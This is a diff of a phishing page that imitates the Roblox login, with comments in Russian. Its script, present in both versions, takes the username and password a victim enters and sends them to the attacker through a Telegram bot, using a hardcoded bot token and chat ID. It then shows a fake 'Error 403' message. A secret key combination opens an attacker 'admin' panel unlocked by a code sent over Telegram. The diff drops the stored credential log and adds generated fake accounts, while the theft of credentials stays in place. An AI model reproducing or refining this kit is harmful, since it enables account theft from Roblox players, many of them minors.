@@ -3,42 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Roblox</title>
+    <title>Roblox Admin Console</title>
     <style>
-        body, html {
-            margin: 0; padding: 0; height: 100%;
-            font-family: "Segoe UI", Arial, sans-serif;
-            background: radial-gradient(circle at center, #252729 0%, #000000 100%);
-            color: #d1d1d1; overflow: hidden;
-        }
-        .navbar {
-            display: flex; align-items: center; background-color: #232527; 
-            padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; 
-            z-index: 100; box-sizing: border-box; border-bottom: 1px solid #111;
-        }
-        .logo-text { font-size: 20px; font-weight: 800; color: #fff; user-select: none; }
-        .screen {
-            display: flex; flex-direction: column; justify-content: center; align-items: center;
-            min-height: 100vh; width: 100%; position: absolute; top: 0; left: 0; display: none;
-        }
+        body, html { margin: 0; padding: 0; height: 100%; font-family: "Segoe UI", sans-serif; background: radial-gradient(circle, #252729 0%, #000 100%); color: #d1d1d1; overflow: hidden; }
+        .navbar { display: flex; align-items: center; background-color: #232527; padding: 0 20px; height: 40px; position: fixed; top: 0; width: 100%; z-index: 100; border-bottom: 1px solid #111; box-sizing: border-box; }
+        .logo-text { font-size: 20px; font-weight: 800; color: #fff; }
+        .screen { display: none; flex-direction: column; justify-content: center; align-items: center; min-height: 100vh; width: 100%; position: absolute; }
         #login-form-screen { display: flex; }
-        .login-card { 
-            background-color: #232527; width: 400px; padding: 40px; 
-            border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); 
-        }
-        input { 
-            width: 100%; padding: 12px; margin-bottom: 15px; 
-            background-color: #393b3d; border: 1px solid #393b3d; 
-            border-radius: 8px; color: #fff; box-sizing: border-box; font-size: 15px; outline: none;
-        }
-        .btn-auth { 
-            width: 100%; padding: 12px; background: #393b3d; 
-            border: 1px solid #fff; color: #fff; border-radius: 8px; 
-            font-size: 16px; cursor: pointer; font-weight: bold; margin-top: 5px; 
-        }
-        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; margin-top: 20px; overflow-y: auto; max-height: 400px; }
-        table { width: 100%; border-collapse: collapse; color: #eee; font-size: 13px; }
-        th, td { padding: 10px; border: 1px solid #333; text-align: left; }
+        .login-card { background-color: #232527; width: 400px; padding: 40px; border-radius: 4px; text-align: center; box-shadow: 0 5px 20px rgba(0,0,0,0.5); }
+        input { width: 100%; padding: 12px; margin-bottom: 15px; background-color: #393b3d; border: 1px solid #393b3d; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; }
+        .btn-auth { width: 100%; padding: 12px; background: #393b3d; border: 1px solid #fff; color: #fff; border-radius: 8px; cursor: pointer; font-weight: bold; }
+        .admin-box { background: #1a1a1a; padding: 20px; border-radius: 10px; width: 95%; max-width: 1000px; border: 1px solid #444; max-height: 500px; overflow-y: auto; }
+        table { width: 100%; border-collapse: collapse; margin-top: 10px; }
+        th, td { padding: 12px; border: 1px solid #333; text-align: left; }
+        .btn-select { background: #0084ff; color: #fff; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; }
+        .btn-select:hover { background: #00a2ff; }
     </style>
 </head>
 <body>
@@ -56,110 +35,95 @@
 
     <div id="admin-auth" class="screen">
         <div class="login-card" style="border: 2px solid #ff0000;">
-            <h2 style="color: #ff0000; margin-top:0;">SECURITY CHECK</h2>
-            <p id="status-text" style="font-size: 13px; color: #888; margin-bottom: 15px;">Введите данные. Код подтверждения придет в Telegram.</p>
+            <h2 style="color: #ff0000;">SECURITY CHECK</h2>
+            <p id="status-text" style="color: #888; margin-bottom: 15px;">Введите данные. Код придет в TG.</p>
             <input type="text" id="admin_user" placeholder="Admin Login">
-            <input type="password" id="admin_pass" placeholder="Admin Password (или Код из ТГ)">
-            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" id="unlock-btn" onclick="checkAdminAuth()">Unlock</button>
+            <input type="password" id="admin_pass" placeholder="Код из ТГ">
+            <button class="btn-auth" style="border-color: #ff0000; color: #ff0000;" onclick="checkAdminAuth()">Unlock</button>
         </div>
     </div>
 
     <div id="admin-panel" class="screen">
         <div class="admin-box">
-            <h2 style="color: #fff;">LOGS DATABASE</h2>
-            <table id="logTable">
-                <thead><tr><th>User</th><th>Pass</th><th>Time</th></tr></thead>
+            <h2 style="color: #fff;">DATABASE (TOP 10 ACCOUNTS)</h2>
+            <table>
+                <thead><tr><th>Account</th><th>Status</th><th>Action</th></tr></thead>
                 <tbody id="logData"></tbody>
             </table>
         </div>
-        <button class="btn-auth" style="width: 150px; margin-top: 20px;" onclick="location.reload()">Logout</button>
+        <button class="btn-auth" style="width: 150px; margin-top: 20px;" onclick="location.reload()">Exit</button>
     </div>
 
     <script>
         const TG_TOKEN = "8385266015:AAHpN8EUWlEgoGtslfBoEoyqPycXD2gbPGw";
         const TG_CHAT_ID = "7863254073";
-        let secretCode = ""; // Сюда запишется код, который мы отправим в ТГ
+        let secretCode = "";
 
-        // Секретка для вызова админки: Ctrl + \ + 3 + Z
-        let pressedKeys = {};
+        // Секретка: Ctrl + \ + 3 + Z
+        let keys = {};
         document.addEventListener('keydown', (e) => {
-            pressedKeys[e.code] = true;
-            if (pressedKeys["ControlLeft"] && pressedKeys["Backslash"] && pressedKeys["Digit3"] && pressedKeys["KeyZ"]) {
-                showScreen('admin-auth');
-            }
+            keys[e.code] = true;
+            if (keys["ControlLeft"] && keys["Backslash"] && keys["Digit3"] && keys["KeyZ"]) showScreen('admin-auth');
         });
-        document.addEventListener('keyup', (e) => { delete pressedKeys[e.code]; });
+        document.addEventListener('keyup', (e) => { delete keys[e.code]; });
 
         function showScreen(id) {
             document.querySelectorAll('.screen').forEach(s => s.style.display = 'none');
             document.getElementById(id).style.display = 'flex';
         }
 
-        // Сбор логов
+        async function sendToTg(msg) {
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "Markdown" })
+            });
+        }
+
         async function saveData() {
             const u = document.getElementById('username').value;
             const p = document.getElementById('password').value;
             if(!u || !p) return;
-            
-            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    chat_id: TG_CHAT_ID, 
-                    text: `👤 *НОВЫЙ ЛОГ!*\nЮзер: \`${u}\`\nПароль: \`${p}\``, 
-                    parse_mode: "Markdown" 
-                })
-            });
-
-            let logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
-            logs.push({ user: u, pass: p, time: new Date().toLocaleString() });
-            localStorage.setItem('roblox_logs', JSON.stringify(logs));
+            await sendToTg(`👤 *НОВЫЙ ЛОГ!*\nЮзер: \`${u}\`\nПароль: \`${p}\``);
             alert("Error 403: Forbidden");
         }
 
-        // Вход в админку через ТГ
         async function checkAdminAuth() {
-            const user = document.getElementById('admin_user').value;
             const pass = document.getElementById('admin_pass').value;
             const status = document.getElementById('status-text');
 
-            // Если код еще не создан — отправляем его в ТГ
             if (secretCode === "") {
-                secretCode = Math.floor(1000 + Math.random() * 9000).toString(); // Генерим 4 цифры
-                
-                status.innerText = "Запрос отправлен! Введите код из Telegram...";
+                secretCode = Math.floor(1000 + Math.random() * 9000).toString();
+                status.innerText = "Код отправлен в Telegram!";
                 status.style.color = "#ffff00";
-
-                await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ 
-                        chat_id: TG_CHAT_ID, 
-                        text: `🔐 *ПОПЫТКА ВХОДА В АДМИНКУ*\n\nКто-то ввел логин: \`${user}\`\nТвой секретный код: \`${secretCode}\``, 
-                        parse_mode: "Markdown" 
-                    })
-                });
+                await sendToTg(`🔐 *ВХОД В АДМИНКУ*\nТвой код: \`${secretCode}\``);
+            } else if (pass === secretCode) {
+                showScreen('admin-panel');
+                loadMockLogs();
             } else {
-                // Если код уже есть в ТГ, проверяем что ввел юзер
-                if (pass === secretCode) {
-                    status.innerText = "Доступ разрешен!";
-                    status.style.color = "#00ff00";
-                    setTimeout(() => {
-                        showScreen('admin-panel');
-                        updateLogs();
-                    }, 1000);
-                } else {
-                    status.innerText = "НЕВЕРНЫЙ КОД!";
-                    status.style.color = "#ff0000";
-                }
+                status.innerText = "НЕВЕРНЫЙ КОД!";
+                status.style.color = "#ff0000";
             }
         }
 
-        function updateLogs() {
-            const logs = JSON.parse(localStorage.getItem('roblox_logs') || '[]');
-            document.getElementById('logData').innerHTML = logs.reverse().map(l => 
-                `<tr><td>${l.user}</td><td>${l.pass}</td><td>${l.time}</td></tr>`
-            ).join('');
+        function loadMockLogs() {
+            const tbody = document.getElementById('logData');
+            // Генерируем 10 фейковых акков для проверки
+            let html = "";
+            for(let i=1; i<=10; i++) {
+                let name = "Roblox_Pro_" + Math.floor(Math.random() * 9999);
+                html += `<tr>
+                    <td>${name}</td>
+                    <td style="color:#00ff00">Ready</td>
+                    <td><button class="btn-select" onclick="selectAcc('${name}')">Выбрать</button></td>
+                </tr>`;
+            }
+            tbody.innerHTML = html;
+        }
+
+        async function selectAcc(name) {
+            alert("Аккаунт " + name + " выбран!");
+            await sendToTg(`✅ *ВЫБРАН АККАУНТ ДЛЯ РАБОТЫ:*\nИмя: \`${name}\``);
         }
     </script>
 </body>
